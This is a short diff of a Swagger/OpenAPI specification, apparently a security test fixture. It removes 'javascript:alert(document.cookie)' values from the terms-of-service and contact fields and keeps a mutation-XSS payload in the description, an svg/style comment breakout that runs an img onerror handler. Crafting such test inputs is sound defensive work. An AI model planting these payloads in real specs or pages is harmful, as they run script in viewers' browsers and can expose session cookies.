@@ -1,12 +1,6 @@
 swagger: '3.0.0'
 info:
   title: API Resource Documentation
-  termsOfService: "javascript:alert(document.cookie)"
-  contact: 
-    name: "API Support",
-    url: "javascript:alert(document.cookie)",
-    email: "javascript:alert(document.cookie)"
-  version: "1.0.1"
   description: |
     <svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">
 
